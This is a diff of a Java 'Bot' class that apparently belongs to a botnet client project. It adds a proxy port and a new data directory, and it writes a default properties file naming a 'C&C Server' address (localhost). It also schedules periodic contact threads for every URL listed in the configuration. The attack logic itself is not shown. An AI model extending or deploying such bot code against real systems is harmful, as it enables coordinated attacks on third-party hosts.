@@ -1,9 +1,13 @@
 package control.client;
 
+import java.io.BufferedWriter;
+import java.io.File;
 import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.InputStream;
+import java.nio.charset.Charset;
+import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.util.ArrayList;
@@ -35,7 +39,7 @@ public class Bot {
 	private SocketBotThread socketBotThread;
 	private Timer timer;
 	private ArrayList<ContactThread> contactThreadList;
-	private Path prjDirPath, dataDirPath, configFilePath, logFilePath, sysInfoFilePath, propertiesFilePath, botDirPath;		
+	private Path prjDirPath, dataDirPath, configFilePath, logFilePath, sysInfoFilePath, propertiesFilePath;		
 	
 	public Bot() {
 	}
@@ -116,6 +120,33 @@ public class Bot {
 		}
 	}
 
+	/**
+	 * Il metodo crea un thread periodico per ogni URL presente nel file di configurazione
+	 */
+	public void start() {
+		contactThreadList = new ArrayList<ContactThread>();
+		timer = new Timer();
+		int tryAgainSeconds = Integer.parseInt(properties.getProperty("tryAgainSeconds","30"));
+		int proxyPort = Integer.parseInt(properties.getProperty("proxyPort","80"));
+		
+		for (int i = 0; i < config.getContactsList().size(); i++) {
+			ContactThread cThread = new ContactThread(config.getContactsList().get(i), timer, tryAgainSeconds, proxyPort);
+			contactThreadList.add(cThread);
+			timer.schedule(cThread, 0);
+		}
+	}
+	
+	/**
+	 * Interruzione dell'invio delle richieste.
+	 * Non usato
+	 */
+	public void stop() {
+		timer.cancel();
+		for (int i = 0; i < contactThreadList.size(); i++) {
+			contactThreadList.get(i).setContactNumber(0);
+		}
+	}
+	
 	private SortMode getSortMode(String sortModeString) {
 		if(sortModeString.equalsIgnoreCase("NONE")){
 			return SortMode.NONE;
@@ -133,13 +164,17 @@ public class Bot {
 	 */
 	private void initPaths() {
 		prjDirPath = Paths.get(System.getProperty("user.dir"));
-		dataDirPath = prjDirPath.resolve("data");
-		botDirPath = dataDirPath.resolve("bot");
-		configFilePath = botDirPath.resolve("bot_config.txt");
-		logFilePath = botDirPath.resolve("bot_log.txt");
-		sysInfoFilePath = botDirPath.resolve("bot_sysinfo.txt");
-		propertiesFilePath = botDirPath.resolve("byobv1.properties");		
-	}
+
+		dataDirPath = prjDirPath.resolve("byobv1data");
+		
+		File dataDir = new File(dataDirPath.toString());
+		dataDir.mkdir();
+		
+		configFilePath = dataDirPath.resolve("bot_config.txt");
+		logFilePath = dataDirPath.resolve("bot_log.txt");
+		sysInfoFilePath = dataDirPath.resolve("bot_sysinfo.txt");
+		propertiesFilePath = dataDirPath.resolve("bot.properties");		
+}
 
 
 	/**
@@ -152,6 +187,30 @@ public class Bot {
 	private Properties readPropertyFile(Path propertiesFilePath) {		
 		Properties returnValue;
 		returnValue = new Properties();
+		
+		File propertiesFile = new File(propertiesFilePath.toString());	
+		try {
+			if(propertiesFile.createNewFile()){
+				Charset charset = Charset.forName("ISO-8859-1");
+				try (BufferedWriter writer = Files.newBufferedWriter(propertiesFilePath, charset)) {
+					writer.write("#Address of C&C Server\n"
+							   + "serverAddress=localhost\n\n"
+							   + "#MAC address sorting mode for ID generation (NONE,RANDOM,ASCENDING)\n"
+							   + "sortMode=ASCENDING\n\n"
+							   + "#Seconds between consecutive attempts in case of sleeping bot\n"
+							   + "tryAgainSeconds=10\n\n"
+							   + "#Server Proxy Port\n"
+							   + "proxyPort=80");	
+					writer.close();
+				} catch (IOException x) {
+				    System.err.format("IOException: %s%n", x);
+				}
+
+			}
+		} catch (IOException e) {
+			e.printStackTrace();
+		}
+		
 		InputStream inputStream = null;
 		try {
 			inputStream = new FileInputStream(propertiesFilePath.toString());
@@ -184,32 +243,6 @@ public class Bot {
 		}
 	}
 
-	/**
-	 * Il metodo crea un thread periodico per ogni URL presente nel file di configurazione
-	 */
-	public void start() {
-		contactThreadList = new ArrayList<ContactThread>();
-		timer = new Timer();
-		int tryAgainSeconds = Integer.parseInt(properties.getProperty("tryAgainSeconds","30"));
-		
-		for (int i = 0; i < config.getContactsList().size(); i++) {
-			ContactThread cThread = new ContactThread(config.getContactsList().get(i), timer, tryAgainSeconds);
-			contactThreadList.add(cThread);
-			timer.schedule(cThread, 0);
-		}
-	}
-	
-	/**
-	 * Interruzione dell'invio delle richieste.
-	 * Non usato
-	 */
-	public void stop() {
-		timer.cancel();
-		for (int i = 0; i < contactThreadList.size(); i++) {
-			contactThreadList.get(i).setContactNumber(0);
-		}
-	}
-	
 	public ArrayList<URLEntryProperty> getContactsListProperty() {
 		ArrayList<URLEntryProperty> returnValue = new ArrayList<URLEntryProperty>();
 		
